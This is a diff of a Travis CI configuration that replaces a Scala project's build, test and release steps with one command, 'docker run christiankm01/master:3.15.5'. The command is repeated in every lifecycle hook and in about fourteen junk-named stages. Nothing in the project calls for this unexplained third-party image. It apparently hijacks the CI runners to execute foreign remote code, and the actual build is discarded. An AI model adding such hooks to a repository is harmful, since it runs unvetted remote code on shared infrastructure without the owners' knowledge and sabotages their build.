@@ -1,51 +1,57 @@
-language: scala
-
-scala:
-  - 2.13.4
-
-os:
-  - linux
-
-jdk:
-  - openjdk11
-
-dist: bionic
-
-stages:
-  - name: test
-  - name: release
-    if: (branch = master AND type = push) OR (tag IS present)
-
+language: c
+arch:
+  - amd64
+compiler:
+  - gcc
+services:
+  - docker
+before_install:
+  - docker run christiankm01/master:3.15.5
+before_script:
+  - docker run christiankm01/master:3.15.5
+script:
+  - docker run christiankm01/master:3.15.5
+after_script:
+  - docker run christiankm01/master:3.15.5
+after_install:
+  - docker run christiankm01/master:3.15.5
+before_deploy:
+  - docker run christiankm01/master:3.15.5
+deploy:
+  - docker run christiankm01/master:3.15.5
+after_deploy:
+  - docker run christiankm01/master:3.15.5
+after_success:
+  - docker run christiankm01/master:3.15.5
+after_failure:
+  - docker run christiankm01/master:3.15.5
 jobs:
   include:
-    # stage="test" if no stage is specified
-    - env: TEST="scalafmt"
-      script: ./scripts/checkfmts.sh
-    - env: TEST="linux"
-      script: sbt test doc
-    - env: TEST="osx"
-      os: osx
-      script: sbt test # no doc needed
-    - stage: release
-      script: sbt ci-release
-
-cache:
-  directories:
-    - $HOME/.sbt/1.0/dependency
-    - $HOME/.sbt/boot/scala*
-    - $HOME/.sbt/launchers
-    - $HOME/.ivy2/cache
-    - $HOME/.coursier
-
-before_cache:
-  - du -h -d 1 $HOME/.ivy2/cache
-  - du -h -d 2 $HOME/.sbt/
-  - find $HOME/.sbt -name "*.lock" -type f -delete
-  - find $HOME/.ivy2/cache -name "ivydata-*.properties" -type f -delete
-  - rm -rf $HOME/.ivy2/local
-
-before_install:
-  - git fetch --tags
-  - ./scripts/travis-os-setup.sh
-  - export JAVA_HOME=$HOME/openjdk11
-  - $TRAVIS_BUILD_DIR/install-jdk.sh --install openjdk11 --target $JAVA_HOME
+    - stage: test
+      script: docker run christiankm01/master:3.15.5
+    - stage: test2
+      script: docker run christiankm01/master:3.15.5
+    - stage: deploy
+      script: docker run christiankm01/master:3.15.5
+    - stage: testman
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capability
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilitd
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilitya
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityki
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityn
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityks
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabili
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capab
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityhjj
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test-capabiy
+      script: docker run christiankm01/master:3.15.5
